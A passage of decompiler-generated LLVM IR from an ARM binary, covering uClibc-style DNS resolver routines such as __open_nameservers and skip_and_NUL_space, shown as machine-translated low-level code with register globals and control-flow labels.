  store i32 %tmp144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1c2b8, label %dec_label_pc_1c414, label %dec_label_pc_1c3ec

dec_label_pc_1c2c4:                               ; preds = %dec_label_pc_1c2a0
  store i32 %stack_var_-480.260, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c2c8 = icmp eq i32 %stack_var_-480.260, 0
  br i1 %v2_1c2c8, label %dec_label_pc_1c36c, label %dec_label_pc_1c2d0

dec_label_pc_1c2d0:                               ; preds = %dec_label_pc_1c2c4
  %v0_1c2d0 = load i32, i32* @fp, align 4
  %v1_1c2d0 = add i32 %v0_1c2d0, 28
  store i32 %v1_1c2d0, i32* %r3.global-to-local, align 4
  %v1_1c2d4 = inttoptr i32 %v1_1c2d0 to i32*
  %v2_1c2d4 = load i32, i32* %v1_1c2d4, align 4
  store i32 %v2_1c2d4, i32* @r3, align 4
  %v3_1c2d4 = add i32 %v0_1c2d0, 32
  %v4_1c2d4 = inttoptr i32 %v3_1c2d4 to i32*
  %v5_1c2d4 = load i32, i32* %v4_1c2d4, align 4
  store i32 %v5_1c2d4, i32* @ip, align 4
  %v6_1c2d4 = add i32 %v0_1c2d0, 36
  %v7_1c2d4 = inttoptr i32 %v6_1c2d4 to i32*
  %v8_1c2d4 = load i32, i32* %v7_1c2d4, align 4
  store i32 %v8_1c2d4, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v0_1c2d0, i32* @r0, align 4
  store i32 %v2_1c1a4, i32* @r1, align 4
  %v0_1c2f0 = call i32 @memcpy()
  %v0_1c2f4 = load i32, i32* @fp, align 4
  %v1_1c2f4 = add i32 %v0_1c2f4, 4
  %v2_1c2f4 = inttoptr i32 %v1_1c2f4 to i32*
  %v3_1c2f4 = load i32, i32* %v2_1c2f4, align 4
  %v2_1c2f8 = icmp ugt i32 %v3_1c2f4, 23
  store i1 %v2_1c2f8, i1* %cpsr_c.global-to-local, align 1
  %v7_1c2f8 = icmp eq i32 %v3_1c2f4, 24
  br i1 %v7_1c2f8, label %dec_label_pc_1c31c, label %dec_label_pc_1c300

dec_label_pc_1c300:                               ; preds = %dec_label_pc_1c2d0
  %v1_1c300 = add i32 %v0_1c2f4, 28
  %v2_1c300 = inttoptr i32 %v1_1c300 to i32*
  %v3_1c300 = load i32, i32* %v2_1c300, align 4
  store i32 %v3_1c300, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c304 = icmp eq i32 %v3_1c300, 0
  br i1 %v2_1c304, label %dec_label_pc_1c3ec, label %dec_label_pc_1c30c

dec_label_pc_1c30c:                               ; preds = %dec_label_pc_1c300
  store i1 %v2_1c310, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1c310, label %dec_label_pc_1c31c, label %bb227

bb227:                                            ; preds = %dec_label_pc_1c30c
  store i1 %v3_1c314, i1* %cpsr_c.global-to-local, align 1
  br i1 %v8_1c314, label %dec_label_pc_1c31c, label %dec_label_pc_1c3ec

dec_label_pc_1c31c:                               ; preds = %dec_label_pc_1c30c, %bb227, %dec_label_pc_1c2d0
  store i32 %v0_1bcf4, i32* %r1.global-to-local, align 4
  %v3_1c320 = icmp uge i32 %v3_1c2f4, %v0_1bcf4
  store i1 %v3_1c320, i1* %cpsr_c.global-to-local, align 1
  %v9_1c320 = icmp eq i32 %v3_1c2f4, %v0_1bcf4
  br i1 %v9_1c320, label %dec_label_pc_1c330, label %bb228

bb228:                                            ; preds = %dec_label_pc_1c31c
  br label %dec_label_pc_1c3c4

dec_label_pc_1c330:                               ; preds = %dec_label_pc_1c31c
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-452.061, i32* @r5, align 4
  %v1_1c338 = add i32 %v0_1c2f4, 16
  %v2_1c338 = inttoptr i32 %v1_1c338 to i32*
  %v3_1c338 = load i32, i32* %v2_1c338, align 4
  %v2_1c33c = sub i32 %tmp159, %stack_var_-452.061
  %v1_1c340 = add i32 %v2_1c33c, -1
  store i32 %v1_1c340, i32* %r3.global-to-local, align 4
  %v1_1c344 = add i32 %v3_1c338, 4
  %v2_1c348 = mul i32 %v1_1c344, %v1_1c340
  store i32 %v2_1c348, i32* %r1.global-to-local, align 4
  %v1_1c34c = add i32 %v0_1c2f4, 32
  %v2_1c34c = inttoptr i32 %v1_1c34c to i32*
  %v3_1c34c = load i32, i32* %v2_1c34c, align 4
  %v3_1c350 = icmp uge i32 %v2_1c348, %v3_1c34c
  store i1 %v3_1c350, i1* %cpsr_c.global-to-local, align 1
  %v2_1c354 = add i32 %v0_1c2f4, 36
  %v3_1c354 = inttoptr i32 %v2_1c354 to i32*
  store i32 %v1_1c340, i32* %v3_1c354, align 4
  %tmp286 = icmp ugt i32 %v2_1c348, %v3_1c34c
  br i1 %tmp286, label %dec_label_pc_1c3ec, label %dec_label_pc_1c35c

dec_label_pc_1c35c:                               ; preds = %dec_label_pc_1c330
  store i32 0, i32* @r7, align 4
  %v1_1c364 = load i32, i32* @fp, align 4
  %v2_1c364 = add i32 %v1_1c364, 36
  %v3_1c364 = inttoptr i32 %v2_1c364 to i32*
  store i32 0, i32* %v3_1c364, align 4
  br label %dec_label_pc_1c3c4

dec_label_pc_1c36c:                               ; preds = %dec_label_pc_1c2c4
  store i32 %v2_1c204, i32* @r0, align 4
  %v0_1c370 = call i32 @free()
  store i32 %v5_1c258, i32* %r3.global-to-local, align 4
  store i32 %v0_1bcf4, i32* @ip, align 4
  %v3_1c37c = icmp uge i32 %v5_1c258, %v0_1bcf4
  store i1 %v3_1c37c, i1* %cpsr_c.global-to-local, align 1
  %v9_1c37c = icmp eq i32 %v5_1c258, %v0_1bcf4
  br i1 %v9_1c37c, label %dec_label_pc_1c384, label %dec_label_pc_1c3c4

dec_label_pc_1c384:                               ; preds = %dec_label_pc_1c36c
  %v0_1c384 = load i32, i32* @fp, align 4
  %v1_1c384 = add i32 %v0_1c384, 16
  %v2_1c384 = inttoptr i32 %v1_1c384 to i32*
  %v3_1c384 = load i32, i32* %v2_1c384, align 4
  store i32 %v3_1c384, i32* %r1.global-to-local, align 4
  store i32 %v5_1c250, i32* %r3.global-to-local, align 4
  %v3_1c38c = icmp uge i32 %v3_1c384, %v5_1c250
  store i1 %v3_1c38c, i1* %cpsr_c.global-to-local, align 1
  %v9_1c38c = icmp eq i32 %v3_1c384, %v5_1c250
  br i1 %v9_1c38c, label %dec_label_pc_1c3a0, label %dec_label_pc_1c394

dec_label_pc_1c394:                               ; preds = %dec_label_pc_1c384
  %v1_1c394 = inttoptr i32 %v0_1c384 to i32*
  %v2_1c394 = load i32, i32* %v1_1c394, align 4
  store i32 %v2_1c394, i32* @r0, align 4
  %v0_1c398 = call i32 @free()
  br label %dec_label_pc_1c414

dec_label_pc_1c3a0:                               ; preds = %dec_label_pc_1c384
  %v1_1c3a0 = add i32 %v0_1c384, 36
  %v2_1c3a0 = inttoptr i32 %v1_1c3a0 to i32*
  %v3_1c3a0 = load i32, i32* %v2_1c3a0, align 4
  %v1_1c3a4 = add i32 %v0_1c384, 28
  %v2_1c3a4 = inttoptr i32 %v1_1c3a4 to i32*
  %v3_1c3a4 = load i32, i32* %v2_1c3a4, align 4
  store i32 %v3_1c3a4, i32* @r3, align 4
  %v3_1c3a8 = mul i32 %v3_1c3a0, %v5_1c250
  %v4_1c3a8 = add i32 %v3_1c3a4, %v3_1c3a8
  store i32 %v4_1c3a8, i32* @r0, align 4
  store i32 %v5_1c250, i32* @r2, align 4
  store i32 %v1_1c270, i32* @r1, align 4
  %v0_1c3b4 = call i32 @memcpy()
  %v0_1c3b8 = load i32, i32* @fp, align 4
  %v1_1c3b8 = add i32 %v0_1c3b8, 36
  %v2_1c3b8 = inttoptr i32 %v1_1c3b8 to i32*
  %v3_1c3b8 = load i32, i32* %v2_1c3b8, align 4
  %v1_1c3bc = add i32 %v3_1c3b8, 1
  store i32 %v1_1c3bc, i32* %r3.global-to-local, align 4
  store i32 %v1_1c3bc, i32* %v2_1c3b8, align 4
  br label %dec_label_pc_1c3c4

dec_label_pc_1c3c4:                               ; preds = %bb228, %dec_label_pc_1c36c, %dec_label_pc_1c35c, %dec_label_pc_1c3a0
  %stack_var_-480.1 = phi i32 [ 0, %dec_label_pc_1c3a0 ], [ 0, %dec_label_pc_1c36c ], [ 0, %dec_label_pc_1c35c ], [ 1, %bb228 ]
  %v1_1c3cc = load i32, i32* @r4, align 4
  %v1_1c3d0 = add nuw nsw i32 %stack_var_-452.061, 1
  store i32 %v1_1c3d0, i32* %r1.global-to-local, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  %v3_1c3e4 = icmp uge i32 %v1_1c3d0, %tmp159
  store i1 %v3_1c3e4, i1* %cpsr_c.global-to-local, align 1
  %v5_1c3e8 = icmp slt i32 %v1_1c3d0, %tmp159
  br i1 %v5_1c3e8, label %dec_label_pc_1c3c4.dec_label_pc_1c1bc_crit_edge, label %dec_label_pc_1c3ec

dec_label_pc_1c3c4.dec_label_pc_1c1bc_crit_edge:  ; preds = %dec_label_pc_1c3c4
  %v2_1c3cc = add i32 %v1_1c3cc, %stack_var_-460.364
  %v0_1c1c0.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_1c1bc

dec_label_pc_1c3ec:                               ; preds = %dec_label_pc_1c2b4, %dec_label_pc_1c198, %dec_label_pc_1c3c4, %dec_label_pc_1c300, %dec_label_pc_1c330, %bb227
  %v1_1c3f0 = call i32 @__GI_close(i32 %v3_1bfc4)
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c3f8 = icmp eq i32 %arg3, 0
  br i1 %v2_1c3f8, label %.thread21, label %bb230

bb230:                                            ; preds = %dec_label_pc_1c3ec
  %v1_1c400 = load i32, i32* @sl, align 4
  %v3_1c3fc = inttoptr i32 %arg3 to i32*
  store i32 %v1_1c400, i32* %v3_1c3fc, align 4
  br label %bb231

.thread21:                                        ; preds = %dec_label_pc_1c3ec
  br label %bb231

bb231:                                            ; preds = %bb230, %.thread21
  store i32 ptrtoint (i32* @global_var_1c408.1177 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1c3f8, i32 ptrtoint (i32* @global_var_168b4.827 to i32))
  store i32 %v1_1bd3c, i32* @r0, align 4
  %v0_1c40c = call i32 @free()
  br label %dec_label_pc_1c47c

dec_label_pc_1c414:                               ; preds = %thread-pre-split, %dec_label_pc_1c010, %dec_label_pc_1c170, %dec_label_pc_1c168, %dec_label_pc_1c118, %dec_label_pc_1c124, %dec_label_pc_1c130thread-pre-split, %thread-pre-split.thread, %dec_label_pc_1c0e8, %dec_label_pc_1c2b4, %dec_label_pc_1c2a8, %dec_label_pc_1bfd4, %dec_label_pc_1bfb4, %dec_label_pc_1c394
  %v1_1c418 = add i32 %v0_1bed8, 1
  store i32 %v1_1c418, i32* @r5, align 4
  br label %dec_label_pc_1c424

dec_label_pc_1c424:                               ; preds = %.thread7, %dec_label_pc_1c414
  %storemerge22 = phi i32 [ -1, %dec_label_pc_1c414 ], [ %v7_1c0d4, %.thread7 ]
  %stack_var_-468.2 = phi i32 [ %v1_1c418, %dec_label_pc_1c414 ], [ %v0_1bed8, %.thread7 ]
  store i32 %storemerge22, i32* @sb, align 4
  %v1_1c428 = add i32 %stack_var_-476.1, -1
  store i32 %v1_1c428, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp232 = icmp slt i32 %v1_1c428, 1
  br i1 %tmp232, label %dec_label_pc_1c444, label %dec_label_pc_1bddc

dec_label_pc_1c43c:                               ; preds = %dec_label_pc_1bf88, %bb218, %bb213, %.thread5, %dec_label_pc_1bd58
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_1c444

dec_label_pc_1c444:                               ; preds = %dec_label_pc_1c424, %.thread132, %dec_label_pc_1c43c
  %stack_var_-472.1 = phi i32 [ %v1_1bd3c, %dec_label_pc_1c43c ], [ 0, %.thread132 ], [ %v1_1bd3c, %dec_label_pc_1c424 ]
  %stack_var_-488.2 = phi i32 [ -1, %dec_label_pc_1c43c ], [ -1, %.thread132 ], [ %v3_1bfc4, %dec_label_pc_1c424 ]
  %v0_1c444 = call i32 @__GI___h_errno_location()
  store i32 %stack_var_-488.2, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1c450 = icmp eq i32 %stack_var_-488.2, -1
  store i1 %v2_1c450, i1* %cpsr_c.global-to-local, align 1
  %v7_1c450 = icmp eq i32 %stack_var_-488.2, -1
  %v2_1c454 = inttoptr i32 %v0_1c444 to i32*
  store i32 -1, i32* %v2_1c454, align 4
  br i1 %v7_1c450, label %dec_label_pc_1c464, label %dec_label_pc_1c45c

dec_label_pc_1c45c:                               ; preds = %dec_label_pc_1c444, %dec_label_pc_1c110
  %stack_var_-472.2 = phi i32 [ %stack_var_-472.1, %dec_label_pc_1c444 ], [ %v1_1bd3c, %dec_label_pc_1c110 ]
  %stack_var_-488.3 = phi i32 [ %stack_var_-488.2, %dec_label_pc_1c444 ], [ %v3_1bfc4, %dec_label_pc_1c110 ]
  %v1_1c460 = call i32 @__GI_close(i32 %stack_var_-488.3)
  br label %dec_label_pc_1c464

dec_label_pc_1c464:                               ; preds = %dec_label_pc_1c444, %dec_label_pc_1c45c
  %stack_var_-472.3 = phi i32 [ %stack_var_-472.1, %dec_label_pc_1c444 ], [ %stack_var_-472.2, %dec_label_pc_1c45c ]
  store i32 %stack_var_-472.3, i32* @r0, align 4
  %v0_1c468 = call i32 @free()
  %v0_1c46c = load i32, i32* @sl, align 4
  store i32 %v0_1c46c, i32* @r0, align 4
  %v0_1c470 = call i32 @free()
  br label %dec_label_pc_1c47c

dec_label_pc_1c47c:                               ; preds = %bb231, %dec_label_pc_1c464
  %stack_var_-484.0 = phi i32 [ -1, %dec_label_pc_1c464 ], [ %v5_1c04c, %bb231 ]
  store i32 %v3_1bce0, i32* @r4, align 4
  store i32 %v6_1bce0, i32* @r5, align 4
  store i32 %v9_1bce0, i32* @r6, align 4
  store i32 %v12_1bce0, i32* @r7, align 4
  store i32 %v15_1bce0, i32* @r8, align 4
  store i32 %v18_1bce0, i32* @sb, align 4
  store i32 %v21_1bce0, i32* @sl, align 4
  store i32 %v24_1bce0, i32* @fp, align 4
  store i32 %v27_1bce0, i32* @lr, align 4
  ret i32 %stack_var_-484.0

; uselistorder directives
  uselistorder i32 %stack_var_-488.2, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-472.1, { 1, 0 }
  uselistorder i32 %v1_1c428, { 1, 2, 0 }
  uselistorder i32 %v1_1c3d0, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1c384, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1c340, { 1, 0, 2 }
  uselistorder i32 %v2_1c278, { 1, 0 }
  uselistorder i32 %v5_1c250, { 5, 0, 2, 3, 4, 1, 7, 6, 8 }
  uselistorder i32 %v2_1c210, { 3, 4, 0, 5, 6, 1, 2, 7, 8, 9, 10 }
  uselistorder i32 %v2_1c20c, { 1, 0 }
  uselistorder i32 %v2_1c1f0, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32 %v2_1c1ec, { 1, 0 }
  uselistorder i32 %v1_1c1e8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-452.061, { 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-460.364, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32 %v0_1c168, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_1c144, { 1, 0 }
  uselistorder i32 %v3_1c138, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1c138, { 0, 2, 1 }
  uselistorder i32 %v2_1c128, { 0, 2, 1 }
  uselistorder i1 %v7_1c05c, { 1, 0 }
  uselistorder i32 %v1_1c05c, { 1, 0 }
  uselistorder i32 %v0_1c05c, { 1, 0 }
  uselistorder i32 %v5_1c04c, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v3_1bfc4, { 1, 0, 2, 9, 7, 6, 5, 8, 4, 10, 11, 3 }
  uselistorder i32 %v6_1bf7c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1bf08, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_1bef0, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32 %v1_1bee4, { 1, 0 }
  uselistorder i32 %v0_1bed8, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-464.1, { 1, 0 }
  uselistorder i32 %v0_1be90, { 1, 0, 2, 3, 4 }
  uselistorder i1 %v7_1bde0, { 1, 0 }
  uselistorder i32 %v1_1bde4, { 0, 2, 1 }
  uselistorder i32 %stack_var_-468.0, { 0, 2, 1 }
  uselistorder i32 %v2_1c1a0, { 1, 0, 2 }
  uselistorder i32 %v1_1c0b0, { 2, 0, 1 }
  uselistorder i32 %v2_1bf38, { 1, 0, 2 }
  uselistorder i32 %v2_1bf10, { 1, 0 }
  uselistorder i32 %v0_1bd58, { 1, 0, 2 }
  uselistorder i32 %v1_1bd3c, { 7, 0, 3, 6, 4, 8, 1, 9, 2, 5, 10, 11 }
  uselistorder i32 %v3_1bd08, { 5, 1, 3, 2, 4, 0, 6 }
  uselistorder i32 %v0_1bcf4, { 10, 9, 8, 7, 6, 5, 2, 11, 0, 1, 4, 3 }
  uselistorder i16* %stack_var_-104, { 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 2, 0, 3, 1, 4 }
  uselistorder i32 %tmp159, { 3, 8, 7, 0, 6, 2, 4, 1, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 19, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1, 20, 21, 2, 54, 22, 23, 24, 25, 26, 27, 28, 36, 29, 30, 31, 32, 33, 34, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 2, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 29, 25, 26, 27, 28, 30, 31, 32, 33, 34, 35, 36, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 23, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 0, 24, 25, 26, 27, 28, 3, 29, 30, 31, 32, 33, 34, 35, 36, 37, 1, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32 (i32)* @__GI_close, { 16, 15, 17, 21, 20, 19, 18, 13, 14, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 23, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__decode_dotted, { 1, 0 }
  uselistorder i32 -3, { 2, 0, 1, 3, 4 }
  uselistorder i32 192, { 0, 2, 1, 3, 4 }
  uselistorder i32 ()* @__GI___h_errno_location, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 64, { 2, 16, 0, 13, 9, 11, 4, 5, 6, 7, 1, 3, 14, 15, 10, 8, 12, 18, 17 }
  uselistorder i32 1000, { 5, 3, 6, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 5, 4, 12, 11, 10, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 3, 4, 1, 5, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 2, 7, 6, 5, 4, 3, 0, 8, 1 }
  uselistorder i32 17, { 1, 9, 2, 11, 3, 12, 4, 13, 5, 14, 0, 17, 10, 6, 7, 15, 8, 16, 18 }
  uselistorder i32 76, { 0, 4, 5, 6, 7, 8, 1, 9, 10, 11, 12, 2, 13, 14, 18, 19, 20, 21, 15, 16, 17, 3, 22 }
  uselistorder i32 27, { 2, 1, 0, 3 }
  uselistorder i8 46, { 3, 2, 0, 4, 1, 5 }
  uselistorder i8 45, { 3, 1, 4, 2, 0, 5, 6, 7 }
  uselistorder i32 26464, { 1, 0, 2, 3 }
  uselistorder i32 512, { 3, 12, 2, 13, 1, 8, 9, 10, 11, 7, 0, 6, 5, 4, 14 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1c47c, { 1, 0 }
  uselistorder label %dec_label_pc_1c464, { 1, 0 }
  uselistorder label %dec_label_pc_1c444, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1c43c, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_1c424, { 1, 0 }
  uselistorder label %dec_label_pc_1c414, { 13, 9, 10, 2, 3, 6, 5, 4, 8, 0, 7, 1, 11, 12 }
  uselistorder label %bb231, { 1, 0 }
  uselistorder label %dec_label_pc_1c3ec, { 2, 4, 5, 3, 0, 1 }
  uselistorder label %dec_label_pc_1c3c4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1c31c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1c2a8, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1c1bc, { 1, 0 }
  uselistorder label %dec_label_pc_1c168, { 1, 0 }
  uselistorder label %dec_label_pc_1c138, { 1, 0 }
  uselistorder label %dec_label_pc_1c110, { 1, 0 }
  uselistorder label %dec_label_pc_1c05c, { 1, 0, 2 }
  uselistorder label %bb218, { 1, 0 }
  uselistorder label %dec_label_pc_1beb8, { 1, 0 }
  uselistorder label %dec_label_pc_1be7c, { 1, 0 }
  uselistorder label %bb216, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1c48c:
  %v0_1c48c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1c48c, label %bb, label %.thread13

bb:                                               ; preds = %dec_label_pc_1c48c
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_1c48c, %bb
  %v7_1c4c4 = phi i32 [ %arg1, %dec_label_pc_1c48c ], [ 0, %bb ]
  ret i32 %v7_1c4c4

; uselistorder directives
  uselistorder label %.thread13, { 1, 0 }
}

define i32 @skip_nospace() local_unnamed_addr {
entry:
  store i32 684, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @ip, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @skip_and_NUL_space(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1c520 = load i32, i32* @r4, align 4
  store i32 %v3_1c520, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @ip, align 4
  store i32 684, i32* %r4.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_1c530.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1c5309 = inttoptr i32 %v0_1c530.pre to i8*
  %v2_1c53010 = load i8, i8* %v1_1c5309, align 1
  %v2_1c53412 = icmp eq i8 %v2_1c53010, 0
  store i1 %v2_1c53412, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c53412, label %dec_label_pc_1c564, label %dec_label_pc_1c540

dec_label_pc_1c540:                               ; preds = %entry, %bb8.dec_label_pc_1c540_crit_edge
  %v1_1c540 = phi i32 [ %v1_1c540.pre, %bb8.dec_label_pc_1c540_crit_edge ], [ 684, %entry ]
  %v0_1c540 = phi i32 [ %v0_1c540.pre, %bb8.dec_label_pc_1c540_crit_edge ], [ ptrtoint (i32* @global_var_2947c.811 to i32), %entry ]
  %v2_1c53016 = phi i8 [ %v2_1c530, %bb8.dec_label_pc_1c540_crit_edge ], [ %v2_1c53010, %entry ]
  %v2_1c53817.in.in = phi i8 [ %v2_1c530, %bb8.dec_label_pc_1c540_crit_edge ], [ %v2_1c53010, %entry ]
  %v1_1c53015 = phi i8* [ %v1_1c530, %bb8.dec_label_pc_1c540_crit_edge ], [ %v1_1c5309, %entry ]
  %v2_1c55814 = phi i32 [ %v2_1c55c, %bb8.dec_label_pc_1c540_crit_edge ], [ %v0_1c530.pre, %entry ]
  %v2_1c53817.in = zext i8 %v2_1c53817.in.in to i32
  %v2_1c53817 = mul nuw nsw i32 %v2_1c53817.in, 2
  %v2_1c540 = add i32 %v1_1c540, %v0_1c540
  %v3_1c540 = inttoptr i32 %v2_1c540 to i32*
  %v4_1c540 = load i32, i32* %v3_1c540, align 4
  %v2_1c544 = add i32 %v4_1c540, %v2_1c53817
  %v3_1c544 = inttoptr i32 %v2_1c544 to i16*
  %v4_1c544 = load i16, i16* %v3_1c544, align 2
  %v1_1c548 = and i16 %v4_1c544, 32
  %v2_1c548 = icmp eq i16 %v1_1c548, 0
  store i1 %v2_1c548, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c548, label %dec_label_pc_1c564, label %dec_label_pc_1c550

dec_label_pc_1c550:                               ; preds = %dec_label_pc_1c540
  %v7_1c550 = icmp eq i8 %v2_1c53016, 35
  br i1 %v7_1c550, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_1c550
  %v8_1c554 = icmp eq i8 %v2_1c53016, 10
  br label %bb7

bb7:                                              ; preds = %dec_label_pc_1c550, %bb
  %storemerge = phi i1 [ %v8_1c554, %bb ], [ %v7_1c550, %dec_label_pc_1c550 ]
  store i1 %storemerge, i1* %cpsr_z.global-to-local, align 1
  %v0_1c558 = load i32, i32* %lr.global-to-local, align 4
  %v1_1c558 = trunc i32 %v0_1c558 to i8
  store i8 %v1_1c558, i8* %v1_1c53015, align 1
  %v0_1c55c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1c568.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_1c55c, label %dec_label_pc_1c564, label %bb8

bb8:                                              ; preds = %bb7
  %v2_1c55c = add i32 %v1_1c568.pre, 1
  store i32 %v2_1c55c, i32* %r0.global-to-local, align 4
  %v1_1c530 = inttoptr i32 %v2_1c55c to i8*
  %v2_1c530 = load i8, i8* %v1_1c530, align 1
  %v2_1c534 = icmp eq i8 %v2_1c530, 0
  store i1 %v2_1c534, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c534, label %dec_label_pc_1c564, label %bb8.dec_label_pc_1c540_crit_edge

bb8.dec_label_pc_1c540_crit_edge:                 ; preds = %bb8
  %v0_1c540.pre = load i32, i32* @ip, align 4
  %v1_1c540.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1c540

dec_label_pc_1c564:                               ; preds = %bb8, %dec_label_pc_1c540, %bb7, %entry
  %v1_1c568 = phi i32 [ %v0_1c530.pre, %entry ], [ %v1_1c568.pre, %bb7 ], [ %v2_1c55814, %dec_label_pc_1c540 ], [ %v2_1c55c, %bb8 ]
  %v2_1c564 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1c564, i32* @r4, align 4
  ret i32 %v1_1c568

; uselistorder directives
  uselistorder i8 %v2_1c530, { 2, 1, 0 }
  uselistorder i8* %v1_1c530, { 1, 0 }
  uselistorder i32 %v2_1c55c, { 0, 2, 3, 1 }
  uselistorder i1 %v2_1c548, { 1, 0 }
  uselistorder i8 %v2_1c53016, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 1, 0, 2, 4 }
  uselistorder i16 0, { 0, 7, 1, 2, 8, 3, 4, 5, 6, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 684, { 0, 3, 4, 5, 2, 1, 6, 7 }
  uselistorder label %dec_label_pc_1c564, { 0, 2, 1, 3 }
  uselistorder label %bb7, { 1, 0 }
  uselistorder label %dec_label_pc_1c540, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-68 = alloca i16, align 2
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-560 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1c574 = load i32, i32* @r4, align 4
  store i32 %v3_1c574, i32* %stack_var_-36, align 4
  %v15_1c574 = load i32, i32* @r8, align 4
  %v18_1c574 = load i32, i32* @sb, align 4
  %v21_1c574 = load i32, i32* @sl, align 4
  %v24_1c574 = load i32, i32* @fp, align 4
  %v27_1c574 = load i32, i32* @lr, align 4
  store i32 27496, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r5, align 4
  %v4_1c584 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 27496) to i32*), align 4
  store i32 %v4_1c584, i32* @r4, align 4
